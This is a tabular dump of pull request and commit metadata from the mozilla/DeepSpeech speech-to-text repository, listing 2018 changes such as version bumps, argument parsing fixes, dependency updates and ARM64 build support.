3105,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1461,1461,Merge tf master,,lissyx,1645737,2018-07-19T10:25:55Z,COLLABORATOR,True,401229,120081,106,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,783b3f084193298d98a3277ead6041ba17660525,Bump version
3106,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1461,1461,Merge tf master,,lissyx,1645737,2018-07-19T10:25:55Z,COLLABORATOR,True,401229,120081,106,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,04d125cc8fc223cafd46ec4ed2e054cca01a85ff,"Fix VERSION reading

Extra linereturn might screw the metadata for Pypi"
3107,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1461,1461,Merge tf master,,lissyx,1645737,2018-07-19T10:25:55Z,COLLABORATOR,True,401229,120081,106,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,05ecd6ae50f39064fc5417a5913911eae2777364,Fix links to tree with tag
3108,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1461,1461,Merge tf master,,lissyx,1645737,2018-07-19T10:25:55Z,COLLABORATOR,True,401229,120081,106,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bf769ff7be0edd32b9f086ba1da2861cda2c5a24,Remove dupe link
3109,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1459,1459,Change NUMPY_VERSION requirements,,lissyx,1645737,2018-07-18T18:36:39Z,COLLABORATOR,True,9,6,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e0e6f08e8ebffc1685031524453f76387bb662c2,Change NUMPY_VERSION requirements
3110,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1455,1455,Use progressbar2 in import_cv.py (Fixes #1454),"progressbar2 checks if there's a change to the output before printing, which should reduce the footprint mentioned in #1454 quite a bit. There's also a sneaky switch from threading.Lock to threading.RLock to improve performance.",reuben,477142,2018-07-11T16:13:05Z,MEMBER,True,15,40,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6cafcda1ddda780bc0d6f3fd3714059cf0cce2a9,Use progressbar2 in import_cv.py
3111,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1453,1453,Argparse fixes,,lissyx,1645737,2018-07-10T08:24:27Z,COLLABORATOR,True,33,5,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,eca036dc9093f9b956d82b3d2740a4223a9275af,"Proper argparse description

Fixes #1452"
3112,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1453,1453,Argparse fixes,,lissyx,1645737,2018-07-10T08:24:27Z,COLLABORATOR,True,33,5,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d4a3ec1f81ff1383b37ab3d80b90b14b6a680c54,"Add --version flag

Fixes #1452"
3113,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1451,1451,Force NodeJS installation from NodeSource repo,Fixes #1450,lissyx,1645737,2018-07-09T20:37:50Z,COLLABORATOR,True,55,44,45,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d276bcab1f84dbd084afcd546ffe31591ed5b3fc,"Force NodeJS installation from NodeSource repo

Fixes #1450"
3114,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1449,1449,Bump to version 0.2.0-alpha.7,,lissyx,1645737,2018-07-09T13:44:41Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0ddb4a6b1e2d84e64338c52d02febcbff2222867,Bump to version 0.2.0-alpha.7
3115,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1444,1444,Non positionnal arguments. Everywhere.,Fixes #1443,lissyx,1645737,2018-07-04T09:20:12Z,COLLABORATOR,True,166,63,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,646c9178cf38e97467a279c9ff00c4d354a37a59,"Non positionnal arguments. Everywhere.

Fixes #1443"
3116,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1442,1442,Remove SciPy dependency from Python module,,reuben,477142,2018-07-03T16:06:45Z,MEMBER,True,30,24,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fb6d34190641bb648385e89c0eeabec29b4ab591,Remove SciPy dependency from Python module
3117,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1442,1442,Remove SciPy dependency from Python module,,reuben,477142,2018-07-03T16:06:45Z,MEMBER,True,30,24,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6a76bc732974da3c2edfed78324ee601085a64dd,Merge branch 'master' into no-scipy
3118,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1439,1439,Augment tc download with branch,Fixes #1438,lissyx,1645737,2018-07-03T08:28:07Z,COLLABORATOR,True,21,7,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,914c92376763f98b54304a1598048becb1767b1d,"Augment tc download with branch

Fixes #1438

X-DeepSpeech: NOBUILD"
3119,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1437,1437,Switch to Python 3.7.0 stable,Fixes #1435,lissyx,1645737,2018-07-03T08:09:21Z,COLLABORATOR,True,10,16,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ab2f150d4a5c8d47b1b9ede644f78b5d23c6826a,"Switch to Python 3.7.0 stable

Fixes #1435"
3120,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1436,1436,Switch to Python 3.7.0 stable,Fixes #1435,lissyx,1645737,2018-07-03T07:34:42Z,COLLABORATOR,False,9,15,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f8d70c04c3735b14ed0e4756646538dc492147c1,"Switch to Python 3.7.0 stable

Fixes #1435"
3121,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1434,1434,Fix OpenSSL package version,Fixes #1433,lissyx,1645737,2018-07-02T17:02:03Z,COLLABORATOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4c819102f373f066bb1a7ca3d7f2be71f5eb5a5f,"Fix OpenSSL package version

Fixes #1433"
3122,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1432,1432,Fix leftover example CLI call,"Fixes #1429

X-DeepSpeech: NOBUILD",lissyx,1645737,2018-07-02T16:47:21Z,COLLABORATOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e5066ac1fceb499215a76ead34af0badd88a88f1,"Fix leftover example CLI call

Fixes #1429

X-DeepSpeech: NOBUILD"
3123,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1431,1431,WIP: Require NumPy API v7,Fixes #1426,lissyx,1645737,2018-07-02T16:32:35Z,COLLABORATOR,True,9,2,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,532145705e8a05315cd6841047f2f06e8cfe785e,"Require NumPy API v7

Temporary fix before proper removal of NumPy and SciPy deps

Fixes #1426

X-DeepSpeech: NOBUILD"
3124,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1430,1430,Improve doc wrt Common Voice 'other',"Fixes #1423

X-DeepSpeech: NOBUILD",lissyx,1645737,2018-07-02T15:02:22Z,COLLABORATOR,True,6,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,848706218b8891b14a2d0f8ce9977b0c175642d6,"Improve doc wrt Common Voice 'other'

Fixes #1423

X-DeepSpeech: NOBUILD"
3125,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1417,1417,Dockerfile: --copt=-D_GLIBCXX_USE_CXX11_ABI=0 flag in all builds,Dockerfile: added --copt=-D_GLIBCXX_USE_CXX11_ABI=0 flag to TF pip package compilation to fix missing _ZN10tensorflow8internal21CheckOpMessageBuilder9NewStringEv symbol error,GeorgeFedoseev,1129837,2018-06-16T07:48:23Z,CONTRIBUTOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6cc58e0f19d0e24196841c70e119b20b8c9c4315,added --copt=-D_GLIBCXX_USE_CXX11_ABI=0 flag to TF pip package compilation to fix missing _ZN10tensorflow8internal21CheckOpMessageBuilder9NewStringEv symbol error
3126,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1405,1405,just log if audio is too small,You don't need to stop tower if some file is inappropriate. Just ignore it and log about ,slavaGanzin,1011721,2018-06-08T15:26:03Z,NONE,False,2,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,910c2ee69dd06ac1b77fcd17743db080c2b593fc,jsut log if audio is too small
3127,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1404,1404,prefix_print utf message,"Hello.

I'm working on russian transcription. While running validation I get:
```python
Traceback (most recent call last):
  File ""DeepSpeech.py"", line 1660, in train
    log_debug('Sending %s...' % job)
  File ""DeepSpeech.py"", line 1432, in next_job
    self._epochs_done.append(epoch)
  File ""DeepSpeech.py"", line 353, in log_info
    if FLAGS.log_level <= 1:
  File ""DeepSpeech.py"", line 341, in prefix_print
    print(prefix + ('\n' + prefix).join(message.split('\n')))
UnicodeEncodeError: 'ascii' codec can't encode characters in position 245-247: ordinal not in range(128)
```

So I add utf8 encode to prefix_print message. I think this shouldn't break anything. So give it a try.
",slavaGanzin,1011721,2018-06-07T13:07:02Z,NONE,False,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3c89dbb3d059536ce5c490283f9b051e2ded7445,prefix_print utf message
3128,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1399,1399,Issue1236,,kdavis-mozilla,12054740,2018-06-01T18:35:11Z,CONTRIBUTOR,True,400303,119783,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e34c52fcb98854c5ecc5639a8ace6196f5825fbd,Fixes #1236 (Switch KenLM to trie based language model)
3129,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1399,1399,Issue1236,,kdavis-mozilla,12054740,2018-06-01T18:35:11Z,CONTRIBUTOR,True,400303,119783,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,754ecd831bdbdf106d1cec759bb6e153cfd93739,Added quntized array language model and trie
3130,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1398,1398,Fixes #1236 (Switch KenLM to trie based language model),Reuben could you take a look and make sure I haven't forgotten to change anything? Thanks.,kdavis-mozilla,12054740,2018-06-01T15:20:50Z,CONTRIBUTOR,False,281640,94630,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e34c52fcb98854c5ecc5639a8ace6196f5825fbd,Fixes #1236 (Switch KenLM to trie based language model)
3131,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1396,1396,Add NodeJS v10.x,Fixes #1394,lissyx,1645737,2018-05-30T17:26:37Z,COLLABORATOR,True,216,22,16,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9d70a798587e086c0dfedd7918ba866566937bc2,Update VERSION to 0.2.0-alpha.6
3132,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1396,1396,Add NodeJS v10.x,Fixes #1394,lissyx,1645737,2018-05-30T17:26:37Z,COLLABORATOR,True,216,22,16,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ad6a0704a72b391e58ddf2d043bb0a986bb531ba,"Add NodeJS v10.x

Fixes #1394"
3133,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1396,1396,Add NodeJS v10.x,Fixes #1394,lissyx,1645737,2018-05-30T17:26:37Z,COLLABORATOR,True,216,22,16,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d08ef842bc1b372ac2cbf77afeacddf671c7a5a7,"Add Python 3.7.0b5

Fixes #1395"
3134,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1393,1393,Remove keyword argument that has default value,"When no `type` keyword argument is passed to the `add_argument` method of an `argparse.ArgumentParser`, the type will be `str` by default and therefore this does not need to be specified.",srstevenson,5845679,2018-05-29T17:30:01Z,CONTRIBUTOR,True,22,25,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ccd8f560ca487ea47700288062f8542f0733670c,"Remove keyword argument that has default value

When no `type` keyword argument is passed to the `add_argument` method
of an `argparse.ArgumentParser`, the type will be `str` by default and
therefore this does not need to be specified."
3135,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1392,1392,Disable dropout in evaluation steps (Fixes #1262),"I did this on top of 7c43ebd / #1391 because I'm rebasing the streaming inference branch on top of both these commits, so you'll probably want to review just commit 806ef16 here, or do the reviews for both PRs in a single pass on this PR.

Sorry for the inconvenience, I wish I knew git well enough to make this work from separate branches. Maybe cherry-picking is the answer...",reuben,477142,2018-05-25T22:37:37Z,MEMBER,True,28,14,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f25c89982ec531e9ce5783c74a2a159a04b96a71,Don't apply dropout in evaluation steps
3136,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1391,1391,Log step avg loss unconditionally,"We condition logging of summaries on `FLAGS.summary_secs > 0`, since the full logging of variables and gradients is expensive.

Logging of step losses is cheap and useful, so there's no need to avoid logging it.

This is what it looks like in TensorBoard when run with LDC93S1: 

<img width=""486"" alt=""screen shot 2018-05-25 at 10 05 51"" src=""https://user-images.githubusercontent.com/477142/40545907-0d091478-601d-11e8-9ec5-b87e40cb680f.png"">
",reuben,477142,2018-05-25T13:11:50Z,MEMBER,True,20,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,da97317d5bd777ccd02a2bf03bcdd9a65b2917e3,Log step avg loss unconditionally
3137,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1387,1387,Correcting Order of parameters,The order of parameters when using the CLI was not correct,Nepomuceno,106517,2018-05-25T08:02:16Z,NONE,False,4,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ca71738dc79ad69cc250f9ee94536e59b5c7bc65,"Correcting Order of parameters

The order of parameters when using the cli was not correct"
3138,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1385,1385,Change order of arguments in the README,`deepspeech --help` says 'usage: deepspeech [-h] model audio alphabet [lm] [trie]'. The documentation is updated accordingly.,ghost,10137,2018-05-23T18:29:17Z,NONE,False,4,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7b9749bcfbcc14920077158476b509058a882b1f,Change order of arguments in the README
3139,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1379,1379,Fix markdown,,lissyx,1645737,2018-05-09T08:23:37Z,COLLABORATOR,True,6,7,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,783b3f084193298d98a3277ead6041ba17660525,Bump version
3140,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1379,1379,Fix markdown,,lissyx,1645737,2018-05-09T08:23:37Z,COLLABORATOR,True,6,7,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,04d125cc8fc223cafd46ec4ed2e054cca01a85ff,"Fix VERSION reading

Extra linereturn might screw the metadata for Pypi"
3141,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1379,1379,Fix markdown,,lissyx,1645737,2018-05-09T08:23:37Z,COLLABORATOR,True,6,7,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,05ecd6ae50f39064fc5417a5913911eae2777364,Fix links to tree with tag
3142,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1379,1379,Fix markdown,,lissyx,1645737,2018-05-09T08:23:37Z,COLLABORATOR,True,6,7,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bf769ff7be0edd32b9f086ba1da2861cda2c5a24,Remove dupe link
3143,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1377,1377,Improve packages docs references and links,Fixes #1376,lissyx,1645737,2018-05-07T09:37:06Z,COLLABORATOR,True,30,4,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,378663d991dcbb21aab818b2b51e79cd5cb9c123,"Improve packages docs references and links

Fixes #1376"
3144,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1374,1374,fix argument order and names of example call,Using the command-line client: fix argument order and names of example call,zenogantner,83638,2018-05-03T11:59:09Z,NONE,False,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d391e86d3a1dac26fc1d46662ea9d014c8d0fde8,"fix argument order and names of example call

Using the command-line client: fix argument order and names of example call"
3145,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1369,1369,Bump to v0.2.0-alpha.3,,lissyx,1645737,2018-04-28T20:37:39Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,34a1b4f09bcf384b5e27fe2b73f087e8b0e3b841,Bump to v0.2.0-alpha.3
3146,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1367,1367,Also remove aarch64 from packages pulling,,lissyx,1645737,2018-04-28T16:43:48Z,COLLABORATOR,True,2,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,05bc98ca862111ee47f9e3dee5cdc0cc46efac4e,Also remove aarch64 from packages pulling
3147,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1366,1366,Bump to v0.2.0-alpha.1,,lissyx,1645737,2018-04-28T15:03:14Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d293b6866e90796974b9afc91e0f9b877dcab870,Bump to v0.2.0-alpha.1
3148,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1365,1365,Remove Aarch64 packages from upload,,lissyx,1645737,2018-04-28T13:24:04Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5ee4c4a0d2d581f522adfba89bc30f6c33a27751,Remove Aarch64 packages from upload
3149,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1364,1364,Avoid duplicated tag name for routes,,lissyx,1645737,2018-04-28T00:42:01Z,COLLABORATOR,True,3,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,10ac90473006ce65ec93283b0f8c17f061b47e2e,Avoid duplicated tag name for routes
3150,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1363,1363,Avoid tc-decision.py breakage,,lissyx,1645737,2018-04-28T00:34:25Z,COLLABORATOR,True,5,6,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,02980ee46dab705f496a5b9067c17a3f9339e2e1,Avoid tc-decision.py breakage
3151,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1362,1362,Improve tag handling,,lissyx,1645737,2018-04-27T23:23:43Z,COLLABORATOR,True,46,42,20,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5520a6b29dce780b4cfdbe509206026fff69d63c,Improve tag handling
3152,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1361,1361,Use new 'tag' event,X-DeepSpeech: NOBUILD,lissyx,1645737,2018-04-27T23:16:32Z,COLLABORATOR,True,4,9,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f4491531cfdd2191080750cdcecfb844f19e5e7d,"Use new 'tag' event

X-DeepSpeech: NOBUILD"
3153,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1360,1360,Add missing branch filtering for v0.2.0-alpha.0,X-DeepSpeech: NOBUILD,lissyx,1645737,2018-04-27T22:43:42Z,COLLABORATOR,True,4,1,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,258a4443643f452b2c7385b31dc2bf37e5e6bbf4,Add missing branch filtering for v0.2.0-alpha.0
3154,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1358,1358,added Dockerfile,,GeorgeFedoseev,1129837,2018-04-26T20:26:37Z,CONTRIBUTOR,True,203,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,21d26563fae8c56e23b62e6970107eb0515ac5f2,added Dockerfile
3155,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1358,1358,added Dockerfile,,GeorgeFedoseev,1129837,2018-04-26T20:26:37Z,CONTRIBUTOR,True,203,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8eb7a58f508906d45eb4eacd38decc0b251c02df,"fixed --cuda flag, added cpu optimization flags"
3156,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1357,1357,Unify version definition,Fixes #1293,lissyx,1645737,2018-04-25T12:53:41Z,COLLABORATOR,True,40,17,20,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e01784894ed6f7ce21d5c389f8725fc474a08ef7,"Unify version definition

Fixes #1293"
3157,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1357,1357,Unify version definition,Fixes #1293,lissyx,1645737,2018-04-25T12:53:41Z,COLLABORATOR,True,40,17,20,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6c463445e357426ed2a8e2b5d54fb7ddc8ccb170,"Fix version extraction on OSX

Fixes #1359"
3158,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1355,1355,WIP: ArchLinux PKGBUILD,Tentive fix for issue #979,lissyx,1645737,2018-04-24T11:05:23Z,COLLABORATOR,False,213,0,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,88fc8e965dcb411803d32fcebee0c34a25846a90,"WIP: ArchLinux PKGBUILD

Tentive fix for issue #979"
3159,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1349,1349,Tf master arm64,,lissyx,1645737,2018-04-19T22:26:18Z,COLLABORATOR,True,435,38,41,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5bb6c0c87fce3e463216699f41af78564e3e06b3,"Force rebuild

X-DeepSpeech: NOBUILD"
3160,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1349,1349,Tf master arm64,,lissyx,1645737,2018-04-19T22:26:18Z,COLLABORATOR,True,435,38,41,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d6daa5a061df73d55962768fda3340590fe6a4a7,"Merge pull request #1338 from lissyx/empty

Force rebuild"
3161,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1349,1349,Tf master arm64,,lissyx,1645737,2018-04-19T22:26:18Z,COLLABORATOR,True,435,38,41,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,19ede1ccdedc1cb35fd033b3aaae037d3df6f0a5,"Force rebuild

X-DeepSpeech: NOBUILD"
3162,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1349,1349,Tf master arm64,,lissyx,1645737,2018-04-19T22:26:18Z,COLLABORATOR,True,435,38,41,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,326d4ec0a03f54fda9998e0f828aada3938c0818,"Merge pull request #1340 from lissyx/empty

Force rebuild"
3163,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1349,1349,Tf master arm64,,lissyx,1645737,2018-04-19T22:26:18Z,COLLABORATOR,True,435,38,41,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f1c433ab90be9c972f3bce76b7e18de674a3d5ab,"native_client/README.md - added hints about bazel and tensorflow versions, and some compile options"
3164,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1349,1349,Tf master arm64,,lissyx,1645737,2018-04-19T22:26:18Z,COLLABORATOR,True,435,38,41,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a05f3c61bcdeac1245fed2656f88086663be7833,"Merge pull request #1345 from godefv/master

native_client/README.md - added hints about bazel and tensorflow vers…

X-DeepSpeech: NOBUILD"
3165,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1349,1349,Tf master arm64,,lissyx,1645737,2018-04-19T22:26:18Z,COLLABORATOR,True,435,38,41,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,83827915365405cf953f5d1fb537135a5903f68b,Fix jessie to stretch naming
3166,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1349,1349,Tf master arm64,,lissyx,1645737,2018-04-19T22:26:18Z,COLLABORATOR,True,435,38,41,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6d07388a4718458217c058b93cc6a4d565307454,Add ARM64 define on KenLM
3167,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1349,1349,Tf master arm64,,lissyx,1645737,2018-04-19T22:26:18Z,COLLABORATOR,True,435,38,41,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4e53683c43443d6c5335ad70e5e2801be395cebb,Add ARM64 builds
3168,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1349,1349,Tf master arm64,,lissyx,1645737,2018-04-19T22:26:18Z,COLLABORATOR,True,435,38,41,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9a92823db296257a21cef7e6c321e30bee7823fd,Add aarch64 python wheel build
3169,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1349,1349,Tf master arm64,,lissyx,1645737,2018-04-19T22:26:18Z,COLLABORATOR,True,435,38,41,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6f0751d27d97dbb59e077c11716d170d5c9481f4,Switch to new TensorFlow r1.6 artifacts
